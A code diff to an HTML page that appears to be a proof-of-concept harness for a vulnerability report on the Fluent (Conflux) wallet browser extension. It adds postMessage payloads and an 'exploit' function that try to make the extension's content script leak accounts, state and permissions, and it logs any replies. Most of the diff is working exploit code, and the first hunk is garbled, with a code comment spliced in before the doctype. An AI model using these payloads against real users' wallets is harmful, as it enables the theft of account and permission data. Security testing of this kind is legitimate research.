@@ -1,4 +1,5 @@
-<!DOCTYPE html>
+// 3. Data Exfiltration
+        async function requestAccounts() {<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -212,6 +213,7 @@
                 <button onclick="raceCondition()">Race Condition Attack</button>
                 <button onclick="messageFlooding()">Message Flooding</button>
                 <button onclick="crossOriginTest()">Cross-Origin Test</button>
+                <button onclick="contentScriptExploit()">🔴 Direct Content Script Exploit</button>
             </div>
         </div>
         
@@ -324,19 +326,32 @@
         }
         
         function sendTestMessage() {
-            log('📤 Sending test postMessage...', 'info');
+            log('📤 Sending test postMessage to Fluent extension...', 'info');
             
             const testPayloads = [
+                // Test 1: Try to trigger content script response
                 { cmd: 'getSensitiveData', __toFluentExtension: true },
-                { method: 'eth_accounts' },
-                { action: 'getState' },
-                { type: 'FLUENT_REQUEST', payload: { method: 'wallet_getPermissions' } }
+                
+                // Test 2: Conflux-specific methods
+                { method: 'cfx_accounts' },
+                { method: 'cfx_requestAccounts' },
+                
+                // Test 3: Try to extract state
+                { action: 'getState', target: 'fluent-content-script' },
+                
+                // Test 4: Try chrome.runtime message format
+                { type: 'FLUENT_REQUEST', payload: { method: 'wallet_getPermissions' } },
+                
+                // Test 5: Try to invoke runtime.onMessage directly
+                { msg: { method: 'cfx_accounts' }, __toFluentContentScript: true }
             ];
             
             testPayloads.forEach((payload, i) => {
                 window.postMessage(payload, '*');
                 log(`Sent payload #${i + 1}: ${JSON.stringify(payload)}`, 'info');
             });
+            
+            log('⚠️ Watch for messages with __fromFluentContentScript flag in the log above', 'warning');
         }
         
         function triggerWalletAction() {
@@ -357,22 +372,47 @@
         async function requestAccounts() {
             log('🔑 Requesting account access...', 'info');
             
-            try {
-                if (window.ethereum) {
-                    const accounts = await window.ethereum.request({ 
-                        method: 'eth_requestAccounts' 
+            // Test Fluent specifically
+            if (window.fluent) {
+                log('Testing Fluent provider...', 'info');
+                try {
+                    const accounts = await window.fluent.request({ 
+                        method: 'cfx_requestAccounts' 
                     });
-                    log(`✅ SUCCESS: Accounts received: ${JSON.stringify(accounts)}`, 'success');
-                } else if (window.conflux) {
+                    log(`✅ SUCCESS: Fluent accounts received: ${JSON.stringify(accounts)}`, 'success');
+                } catch (error) {
+                    log(`Fluent error: ${error.message}`, 'error');
+                }
+            }
+            
+            // Test Conflux
+            if (window.conflux && window.conflux !== window.fluent) {
+                log('Testing Conflux provider...', 'info');
+                try {
                     const accounts = await window.conflux.request({ 
                         method: 'cfx_requestAccounts' 
                     });
                     log(`✅ SUCCESS: Conflux accounts received: ${JSON.stringify(accounts)}`, 'success');
-                } else {
-                    log('❌ No provider available', 'error');
+                } catch (error) {
+                    log(`Conflux error: ${error.message}`, 'error');
                 }
-            } catch (error) {
-                log(`❌ Error: ${error.message}`, 'error');
+            }
+            
+            // Also test eth_accounts without requesting (check if already connected)
+            if (window.ethereum) {
+                log('Checking Ethereum accounts (should be empty if not connected)...', 'info');
+                try {
+                    const accounts = await window.ethereum.request({ 
+                        method: 'eth_accounts' 
+                    });
+                    if (accounts.length > 0) {
+                        log(`⚠️ Ethereum accounts available: ${JSON.stringify(accounts)}`, 'warning');
+                    } else {
+                        log('No Ethereum accounts (not connected)', 'info');
+                    }
+                } catch (error) {
+                    log(`Error: ${error.message}`, 'error');
+                }
             }
         }
         
@@ -611,6 +651,60 @@
                 }, '*');
                 log(`Sent message claiming origin: ${origin}`, 'info');
             });
+        }
+        
+        function contentScriptExploit() {
+            log('🔴 CRITICAL TEST: Attempting direct content script exploitation...', 'error');
+            log('This test targets the exact vulnerability pattern from your report', 'warning');
+            
+            // Set up a listener for the response
+            let exploitListener = (event) => {
+                if (event.data && event.data.__fromFluentContentScript) {
+                    log('🚨🚨🚨 VULNERABILITY CONFIRMED! 🚨🚨🚨', 'error');
+                    log('Extension is responding via __fromFluentContentScript', 'error');
+                    log(`Response data: ${JSON.stringify(event.data)}`, 'error');
+                    log('This confirms bidirectional communication vulnerability!', 'error');
+                    
+                    // Try to extract more data
+                    if (event.data.msg) {
+                        log(`Message payload: ${JSON.stringify(event.data.msg)}`, 'error');
+                    }
+                }
+            };
+            
+            window.addEventListener('message', exploitListener);
+            
+            // Send various payloads that might trigger runtime.onMessage
+            const exploitPayloads = [
+                // Direct runtime.onMessage simulation
+                { action: 'getState' },
+                { action: 'getAccounts' },
+                { action: 'getPermissions' },
+                
+                // Conflux-specific
+                { method: 'cfx_accounts', params: [] },
+                { method: 'cfx_requestAccounts', params: [] },
+                { method: 'wallet_getPermissions', params: [] },
+                
+                // Try to trigger any chrome.runtime.sendMessage response
+                { type: 'FROM_PAGE', payload: { action: 'ping' } },
+                { source: 'fluent-inpage', type: 'REQUEST', data: { method: 'cfx_accounts' } }
+            ];
+            
+            exploitPayloads.forEach((payload, i) => {
+                setTimeout(() => {
+                    window.postMessage(payload, location.origin);
+                    log(`Exploit payload ${i + 1} sent: ${JSON.stringify(payload).substring(0, 100)}`, 'warning');
+                }, i * 100);
+            });
+            
+            log('⏳ Waiting for responses... Check log for __fromFluentContentScript messages', 'warning');
+            
+            // Clean up listener after 10 seconds
+            setTimeout(() => {
+                window.removeEventListener('message', exploitListener);
+                log('Exploit test complete. If no VULNERABILITY CONFIRMED message appeared, the vulnerability may not be present or requires different payloads.', 'info');
+            }, 10000);
         }
         
         // Initialize
